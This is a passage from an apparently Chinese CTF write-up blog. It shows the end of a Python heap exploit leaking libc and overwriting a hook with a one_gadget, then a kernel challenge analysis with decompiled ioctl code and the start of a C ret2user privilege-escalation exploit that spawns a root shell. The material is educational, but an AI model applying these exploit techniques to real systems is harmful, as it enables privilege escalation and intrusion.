</span></span><span class=line><span class=cl>        <span class=n>change</span><span class=p>(</span><span class=mi>0</span><span class=o>+</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x98</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x111</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=mi>2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>change</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x98</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x71</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\xdd\x25</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x2b</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad3c80</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>rn</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>un64</span><span class=p>(</span><span class=n>rn</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span><span class=mh>0x3c5600</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>&amp;</span> <span class=mh>0xfff</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>change</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x98</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x71</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span><span class=mh>0x3c4aed</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>one</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span><span class=mh>0x4526a</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0xb</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span><span class=mh>0x846CB</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>dbg</span><span class=p>(</span><span class=s2>&#34;b*&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>one</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>rc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s2>&#34;cat flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>shell</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babyhacker>babyhacker</h3><p>flag就在<code>iniramfs.cpio</code>中，打开就能看到</p><h3 id=babyhacker2>babyhacker2</h3><p>size比较可以设为负数，buffersize只取两个字节</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>getsize</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)</span><span class=n>arg</span> <span class=o>&gt;=</span> <span class=mi>11</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>LOWORD</span><span class=p>(</span><span class=n>arg</span><span class=p>)</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>buffersize</span> <span class=o>=</span> <span class=n>arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.text:00000000000000E0 ; void __fastcall getsize(unsigned __int64 arg)
</span></span><span class=line><span class=cl>.text:00000000000000E0                 public getsize
</span></span><span class=line><span class=cl>.text:00000000000000E0 getsize         proc near               ; DATA XREF: __mcount_loc:0000000000000200↓o
</span></span><span class=line><span class=cl>.text:00000000000000E0 arg = rdi                               ; unsigned __int64
</span></span><span class=line><span class=cl>.text:00000000000000E0                 call    __fentry__
</span></span><span class=line><span class=cl>.text:00000000000000E5                 push    rbp
</span></span><span class=line><span class=cl>.text:00000000000000E6                 cmp     edi, 0Bh
</span></span><span class=line><span class=cl>.text:00000000000000E9                 mov     eax, 0Ah
</span></span><span class=line><span class=cl>.text:00000000000000EE                 cmovge  edi, eax
</span></span><span class=line><span class=cl>.text:00000000000000F1                 mov     rbp, rsp
</span></span><span class=line><span class=cl>.text:00000000000000F4                 mov     cs:buffersize, di
</span></span><span class=line><span class=cl>.text:00000000000000FB                 pop     rbp
</span></span><span class=line><span class=cl>.text:00000000000000FC                 retn
</span></span><span class=line><span class=cl>.text:00000000000000FC getsize         endp
</span></span></code></pre></td></tr></table></div></div><p>用一个低位为0xFFF的负数即可给予buffersize一个比较大的正数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>babyhacker_ioctl</span><span class=p>(</span><span class=n>file</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>file</span> <span class=o>*</span><span class=n>rdx1</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>signed</span> <span class=kr>__int16</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// di
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>[</span><span class=mi>80</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-150h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// [rsp+140h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// [rsp+148h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=p>(</span><span class=kt>signed</span> <span class=kr>__int16</span><span class=p>)</span><span class=n>rdx1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>switch</span> <span class=p>(</span> <span class=n>cmd</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x30001u</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>babyhacker_ioctl_0</span><span class=p>(</span><span class=n>rdx1</span><span class=p>,</span> <span class=mh>0x30001u</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>rdx1</span><span class=p>,</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v9</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x30002u</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>copy_to_user</span><span class=p>(</span><span class=n>rdx1</span><span class=p>,</span> <span class=n>v4</span><span class=p>,</span> <span class=n>buffersize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mh>0x30000u</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)</span><span class=n>rdx1</span> <span class=o>&gt;=</span> <span class=mi>11</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>buffersize</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>利用<code>0x30002</code>读取栈上数据，得到<code>canary</code>与<code>kernel base</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=n>__usercall</span> <span class=n>babyhacker_ioctl_0</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rax</span><span class=o>&gt;</span><span class=p>(</span><span class=n>file</span> <span class=o>*</span><span class=n>file</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rdi</span><span class=o>&gt;</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=err>@</span><span class=o>&lt;</span><span class=n>esi</span><span class=o>&gt;</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>arg</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rdx</span><span class=o>&gt;</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a4</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rbp</span><span class=o>&gt;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>[</span><span class=mi>80</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-150h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+140h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [rsp+148h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=n>a4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=nf>copy_from_user</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=n>file</span><span class=p>,</span> <span class=n>buffersize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>利用<code>0x30001</code>栈溢出，布置ROPCHAIN实现ret2user
exp.c</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>//gcc exp.c -static -o exp
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stropts.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>payload</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>padding</span><span class=p>[</span><span class=mh>0x144</span><span class=p>]</span><span class=o>=</span><span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>payload_len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>user_cs</span><span class=p>,</span> <span class=n>user_ss</span><span class=p>,</span> <span class=n>user_rflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>long</span> <span class=kt>long</span> <span class=n>user_stack</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>long</span> <span class=kt>long</span> <span class=n>prepare_kernel_cred</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>long</span> <span class=kt>long</span> <span class=n>commit_creds</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>launch_shell</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>execl</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>get_root</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>pkc</span><span class=p>)(</span><span class=kt>int</span><span class=p>)</span> <span class=o>=</span> <span class=n>prepare_kernel_cred</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>cc</span><span class=p>)(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span> <span class=o>=</span> <span class=n>commit_creds</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=n>cc</span><span class=p>)((</span><span class=o>*</span><span class=n>pkc</span><span class=p>)(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %2</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;swapgs</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %0</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %2</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %3</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;push %4</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;iretq</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span>  <span class=s>&#34;r&#34;</span> <span class=p>(</span><span class=n>user_ss</span><span class=p>),</span> <span class=s>&#34;r&#34;</span> <span class=p>(</span><span class=n>user_stack</span><span class=p>),</span> <span class=s>&#34;r&#34;</span> <span class=p>(</span><span class=n>user_rflags</span><span class=p>),</span> <span class=s>&#34;r&#34;</span> <span class=p>(</span><span class=n>user_cs</span><span class=p>),</span> <span class=s>&#34;r&#34;</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>launch_shell</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=s>&#34;memory&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>save_state</span><span class=p>()</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;movq %%cs, %0</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;movq %%ss, %1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;pushfq</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;popq %2</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>:</span> <span class=s>&#34;=r&#34;</span> <span class=p>(</span><span class=n>user_cs</span><span class=p>),</span> <span class=s>&#34;=r&#34;</span> <span class=p>(</span><span class=n>user_ss</span><span class=p>),</span> <span class=s>&#34;=r&#34;</span> <span class=p>(</span><span class=n>user_rflags</span><span class=p>)</span> <span class=o>:</span> <span class=o>:</span> <span class=s>&#34;memory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>join_data</span><span class=p>(</span><span class=kt>long</span> <span class=kt>long</span> <span class=n>data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>data</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=n>payload_len</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>payload_len</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>join_str</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=n>payload_len</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>payload_len</span> <span class=o>+=</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>signal</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>launch_shell</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>save_state</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babyhacker&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x30000</span><span class=p>,</span> <span class=mh>0xf0000fff</span><span class=p>);</span>
